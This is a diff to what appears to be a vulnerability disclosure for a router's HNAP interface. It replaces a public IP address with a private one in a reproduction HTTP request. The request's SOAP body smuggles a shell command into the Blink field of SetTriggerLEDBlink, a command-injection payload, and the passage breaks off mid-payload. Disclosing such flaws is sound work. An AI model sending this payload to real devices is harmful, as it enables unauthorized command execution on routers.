@@ -34,7 +34,7 @@ In order to reproduce the vulnerability, the following steps can be followed:
 
 ```
 POST /HNAP1/ HTTP/1.1
-Host: 81.70.52.167:7018
+Host: 192.168.0.1:7018
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -44,9 +44,9 @@ SOAPAction: "http://purenetworks.com/HNAP1/SetLEDStatus"
 HNAP_AUTH: FBAFE6649BD7D7195037F941B5248F0F 1649150396101
 X-Requested-With: XMLHttpRequest
 Content-Length: 338
-Origin: http://81.70.52.167:7018
+Origin: http://192.168.0.1:7018
 Connection: close
-Referer: http://81.70.52.167:7018/Admin.html
+Referer: http://192.168.0.1:7018/Admin.html
 Cookie: SESSION_ID=2:1556825615:2; uid=UXOR3rQa
 
 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetLEDStatus xmlns="http://purenetworks.com/HNAP1/"><Enabled>false</Enabled></SetLEDStatus><SetTriggerLEDBlink><Blink>&& ls > /tmp/456 &&echo 1>
